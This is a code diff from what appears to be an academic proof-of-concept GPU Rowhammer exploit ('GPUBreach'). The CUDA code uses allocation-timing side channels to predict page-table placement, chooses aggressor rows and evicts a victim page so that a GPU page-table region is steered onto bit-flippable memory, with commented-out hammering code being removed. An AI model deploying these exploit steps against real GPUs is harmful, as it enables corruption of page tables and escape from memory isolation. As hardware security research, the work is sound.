@@ -49,15 +49,16 @@ first_PT_region_test (int argc, char *argv[])
   uint64_t next_id = max_alloc_chunks;
   for (uint64_t i = 0; i < max_alloc_chunks; i += 1)
     {
-      // Create Free Space
       cudaMallocManaged (&temp, ALLOC_SIZE + 4096);
 
       double currentMS = time_data_access (temp + ALLOC_SIZE, 1);
       DBG_OUT << i << " New PT time: " << currentMS << " ms" << std::endl;
 
+      // Skip timing spikes. At 512, there should be evictions (4KB * 512 = 2MB)
       if (i < skip || i % 512 == 0)
         continue;
 
+      // Found spike, set when the next spike will happen
       if (currentMS > threshold && next_id == max_alloc_chunks)
         {
           next_id = i + 508;
@@ -67,6 +68,7 @@ first_PT_region_test (int argc, char *argv[])
           std::cout << "Next Allocation Spike Id: \033[1m" << " " << next_id
                     << "\033[0m." << std::endl;
         }
+      // Found subsequent spike and check if the side-channel prediction match
       else if (currentMS > threshold)
         {
           std::cout << "Expected: id\033[1;32m " << next_id
@@ -79,7 +81,7 @@ first_PT_region_test (int argc, char *argv[])
 }
 
 static uint64_t
-hardcoded_rowhammer_bitflip_page (GPUBreachContext &ctx)
+load_rowhammer_bitflip_info (GPUBreachContext &ctx)
 {
   uint8_t *temp;
   auto& alloc_ptrs = ctx.step1_data.alloc_ptrs;
@@ -108,24 +110,24 @@ hardcoded_rowhammer_bitflip_page (GPUBreachContext &ctx)
   RowList rows = read_row_from_file (row_set_file, layout);
   row_set_file.close ();
 
-  /* Get Target Aggressors That Trigger the Bit-flip */
-  
   std::vector<uint64_t> target_agg;
   std::vector<uint64_t> all_vics (num_rows);
   std::iota (all_vics.begin (), all_vics.end (), 0);
+
+  /* Get Aggressor Rows for this bit-flip. Aggressors in Ascending order*/
+  /*              ← Left   Right →             */
+  /* A       ...       A V A       ...       A */
   target_agg = get_aggressors_dir (rows, crit_agg, num_agg, row_step, left);
   std::vector<uint64_t> temp_vec; temp_vec.push_back(vic_row);
 
-  // The first page to reserve required for Rowhammer Attack
+  // Calculate the start, end, and amount of the pages required for aggressor rows
   uint64_t first_hammer_page
       = static_cast<uint64_t> (rows[target_agg[0]][0] - layout) / ALLOC_SIZE;
-
-  // The last page to reserve required for Rowhammer Attack. This case, its the
-  // VICTIM page.
-  uint64_t last_hammer_page
+  uint64_t victim_page
       = static_cast<uint64_t> (rows[vic_row][0] - layout) / ALLOC_SIZE;
   uint64_t to_reserve
-      = left ? last_hammer_page - first_hammer_page : (static_cast<uint64_t> (rows[target_agg.back()][0] - layout) / ALLOC_SIZE) - last_hammer_page; // Last page excluded.
+      = left ? victim_page - first_hammer_page : (static_cast<uint64_t> (rows[target_agg.back()][0] - layout) / ALLOC_SIZE) - victim_page; // Last page excluded.
+  
   /**
    * Segragate aggressor row pages from the rest, using same insight as Paper
    * Section 4.3 Given our memory is full, freed physical memory is immediately
@@ -141,6 +143,7 @@ hardcoded_rowhammer_bitflip_page (GPUBreachContext &ctx)
       DBG_OUT << first_hammer_page + i << '\n';
     }
 
+  /* We reconfigure the aggressor row addresses using the new virtual addresses */
   auto offset_map = get_relative_aggressor_offset (rows, target_agg, layout);
   auto row_agg_pair
       = get_aggressor_rows_from_offset (agg_ptrs, offset_map);
@@ -152,43 +155,7 @@ hardcoded_rowhammer_bitflip_page (GPUBreachContext &ctx)
   if (!left)
     std::reverse(agg_vec.begin(), agg_vec.end());
 
-  // const uint64_t it = ctx.bitflip_config.it;
-  // const uint64_t n = ctx.bitflip_config.n;
-  // const uint64_t k = ctx.bitflip_config.k;
-  // const uint64_t delay = ctx.bitflip_config.delay;
-  // const uint64_t period = ctx.bitflip_config.period;
-  // const uint64_t repeat = ctx.bitflip_config.repeat;
-
-  // set_rows (rows, temp_vec, 0xaa, step);
-  // memset_ptr<<<1,1>>>(alloc_ptrs[last_hammer_page], 0xaaaaaaaaaaaaaaaa, ALLOC_SIZE);
-  // // cudaDeviceSynchronize();
-  // // set_rows (rows, target_agg, agg_pat, step);
-  // // cudaDeviceSynchronize();
-  // evict_L2cache(layout);
-  // cudaDeviceSynchronize();
-  
-
-  // std::reverse(target_agg.begin(), target_agg.end());
-  // std::cout << vector_str(target_agg) << '\n';
-  // for (int j = 0; j < repeat; j++)
-  //   uint64_t time = start_multi_warp_hammer (
-  //       agg_row_list, agg_vec, it, n, k, agg_vec.size (), delay, period);
-  
-  // std::cout << (void*)alloc_ptrs[last_hammer_page] << '\n';
-  // for (int j = 0; j < ALLOC_SIZE; j+=1)
-  // {
-  //   if (*(uint8_t *)(alloc_ptrs[last_hammer_page] + j) != 0x00)
-  //     std::cout << (void*) (alloc_ptrs[last_hammer_page] + j) << ' ' << (void*)*(uint8_t *)(alloc_ptrs[last_hammer_page] + j) << '\n';
-  //   if (*(uint8_t *)(alloc_ptrs[last_hammer_page] + j)== 0xea)
-  //   {
-  //     std::cout << "Flipping still" << '\n';
-  //     break;
-  //   }
-  // }
-  // std::cout << "No Flip?" << '\n';
-  // paused();
-
-  return last_hammer_page;
+  return victim_page;
 }
 
 bool
@@ -212,18 +179,8 @@ first_PT_region (uint64_t num_alloc_init, double threshold, uint64_t skip, GPUBr
       exit (1);
     }
 
-  /****************************************************************/
-  /* Unfortunately the Rowhammer Bit-flip is currently hardcoded. */
-  /* Future plan: add configuration files instead of cmdline args */
-
-  /**
-   * This variable controls which page in 'alloc_ptrs' we massage
-   * the PT region to. Given a page is 2MB, changing it to whatever
-   * page you'd like that fits in your VRAM, but 1000-3000 should be
-   * feasible on most GPUs (8GB+).
-   */
   auto& alloc_ptrs = ctx.step1_data.alloc_ptrs;
-  auto last_hammer_page = hardcoded_rowhammer_bitflip_page (ctx);
+  auto victim_page = load_rowhammer_bitflip_info (ctx);
 
   /****************************************************************/
   /* Step 2 of Paper: Massaging first PT Region to Flippy Memory */
@@ -235,12 +192,14 @@ first_PT_region (uint64_t num_alloc_init, double threshold, uint64_t skip, GPUBr
   
   for (uint64_t i = 0; i < num_alloc_init; i += 1)
     {
-      // Create free space for Page Table Region
+      // Evict vicimt page to create free space for PT Region
       if (i == next_id)
-        evict_from_device (alloc_ptrs[last_hammer_page], ALLOC_SIZE);
+        evict_from_device (alloc_ptrs[victim_page], ALLOC_SIZE);
 
+      // Generating 2MB + 4KB pages
       cudaMallocManaged (&temp, ALLOC_SIZE + 4096);
 
+      // Only trigger 4KB allocation to save memory.
       double currentMS = time_data_access (temp + ALLOC_SIZE, 1);
       DBG_OUT << i << " New PT time: " << currentMS << " ms" << std::endl;
 
@@ -248,8 +207,11 @@ first_PT_region (uint64_t num_alloc_init, double threshold, uint64_t skip, GPUBr
       if (i < skip || i % 512 == 0)
         continue;
 
+      // PT region now in the victim page, can break. 
       if (i == next_id)
         break;
+      
+      // Found spike, set when the next spike will happen.
       if (currentMS > threshold && next_id == ERR_next_id)
         next_id = i + 508;
     }
@@ -268,7 +230,7 @@ first_PT_region (uint64_t num_alloc_init, double threshold, uint64_t skip, GPUBr
 
   /****************************************************************/
 
-  /* Free up GPU/CPU memory by releasing the evicted memories */
+  /* Free up GPU/CPU memory by releasing the evicted memories and prior memories */
   cudaFree (alloc_ptrs[0]);
   alloc_ptrs.clear ();
 
